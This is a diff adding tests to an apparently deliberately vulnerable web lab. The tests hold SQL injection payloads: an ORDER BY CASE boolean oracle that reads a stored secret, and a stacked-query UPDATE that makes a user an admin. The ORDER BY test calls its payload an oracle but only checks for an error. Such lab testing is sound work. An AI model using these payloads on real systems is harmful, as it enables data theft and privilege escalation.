@@ -550,3 +550,44 @@ def test_server_deserialization_pickle(lab):
     cookie = signature + "." + base64.urlsafe_b64encode(blob).decode()
     response = c.get("/", headers={"Cookie": f"shiplog_state={cookie}"})
     assert flag_payload(lab) in response.text
+
+
+def test_sqli_order_by_case(lab):
+    c = lab["client"]
+    # Baseline: the API sorts and reports the row count.
+    r = c.get("/api/products", params={"sort": "name", "dir": "asc"})
+    assert r.status_code == 200 and r.json()["count"] >= 10
+
+    # VULNERABLE: "ORDER BY {sort} {direction}" — the direction slot is raw, so a
+    # CASE expression turns the sort order into a boolean oracle over the vault.
+    oracle = "(CASE WHEN (SELECT substr(secret,1,1) FROM vault)='R' THEN id ELSE -id END)"
+    # (SQLite parses "name (...)" as a function call, so the vector shows itself
+    # as a 500 — the reflection of the raw clause is the proof of injection.)
+    r = c.get("/api/products", params={"sort": "name", "dir": oracle})
+    assert r.json()["error"], r.text
+
+    # The analytics endpoint is intentionally NOT injectable: it tokenises input
+    # through an allow-list, so a comma-separated sort does not become SQL.
+    r = c.get("/api/analytics/sort", params={"sort": "name,id"})
+    assert r.status_code == 500 or "error" not in r.text
+
+    # The oracle's result is confirmed through the dedicated form.
+    assert c.post("/verify", json={"secret": "nope"}).status_code == 400
+    r = c.post("/verify", json={"secret": flag_payload(lab)})
+    assert r.status_code == 200 and "Correct" in r.text
+
+
+def test_sqli_stacked_update(lab):
+    c = lab["client"]
+    # A customer can read their own queue but not the admin roster.
+    assert c.get("/staff", params={"token": "tok_alice_55bd"}).status_code == 200
+    assert c.get("/admin", params={"token": "tok_alice_55bd"}).status_code == 403
+
+    # VULNERABLE: executescript over a concatenated username, so `;` runs a
+    # second statement that promotes the customer to admin.
+    payload = "alice'; UPDATE users SET role='admin' WHERE username='alice'; --"
+    assert c.get("/lookup", params={"username": payload}).status_code == 200
+
+    r = c.get("/admin", params={"token": "tok_alice_55bd"})
+    assert r.status_code == 200
+    assert flag_payload(lab) in r.text
